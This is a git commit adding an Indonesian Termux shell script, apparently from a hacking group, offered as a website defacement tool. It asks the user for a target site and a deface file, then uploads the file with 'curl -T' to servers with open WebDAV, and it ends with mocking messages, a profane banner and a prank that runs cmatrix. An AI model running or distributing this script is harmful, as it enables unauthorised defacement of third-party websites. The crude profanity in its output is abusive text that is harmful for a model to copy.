ca68829814792a61c5ed2f567c0de6afec980f43
hackday404 <54924067+hackday404@users.noreply.github.com>
2019-09-05 14:51:49 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,58 @@
+toilet -f standard -F gay "Deface"
+sleep 1
+toilet -f standard -F gay "Webdav"
+sleep 1
+toilet -f standard -F gay "UPDATE 2019"
+sleep 1
+sleep 1
+echo "======================================"
+
+echo "#Creator : Mr_HACKDAY"
+echo "#Country : PLANET NAMEX"
+echo "#GRUP    : CYBER NET MUSLIM ( B.C.T )
+
+echo "======================================"
+sleep 3
+echo "[+] Tunggu Sebentar..."
+sleep 5
+pkg install curl
+sleep 1
+echo "========================================="
+echo "Taruh Script Defacenya"
+echo "ke Internal/penyimpanan telepon ya kawan.."
+echo "========================================="
+sleep 8
+read -p "Nama  Website Targetnya gan  #/cmd/python26/ " target
+read -p "Nama sript Deface kamu  #/cmd/python26/index/ " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [+] Suksess... "
+sleep 2
+echo " [+] Tapi boong"
+sleep 2
+echo " [+] Wkwkwk"
+sleep 2
+echo " [+] Bercanda bro .."
+sleep 2
+echo " [+] Jika Muncul tulisan (can't open)"
+sleep 3
+echo " [+] Berati Gagal ya/website tidak vuln"
+sleep 2
+echo " [+] Jika tidak muncul apa - apa"
+sleep 2
+echo " [+] Berati Berhasill"
+sleep 2
+echo " [+] Thanks yang udah install tools kami"
+sleep 2
+echo " [!] Tunggu Bentar, Ada hadiah Dari kami"
+sleep 2
+echo " [+] Waiting For Server..."
+sleep 5
+clear
+figlet kontol lu babi
+figlet by: HACKDAY CYBER TEAM
+echo " Dalam hitungan ke 3 Termux kamu akan Error"
+sleep 1
+pkg install cmatrix
+cmatrix
+
+
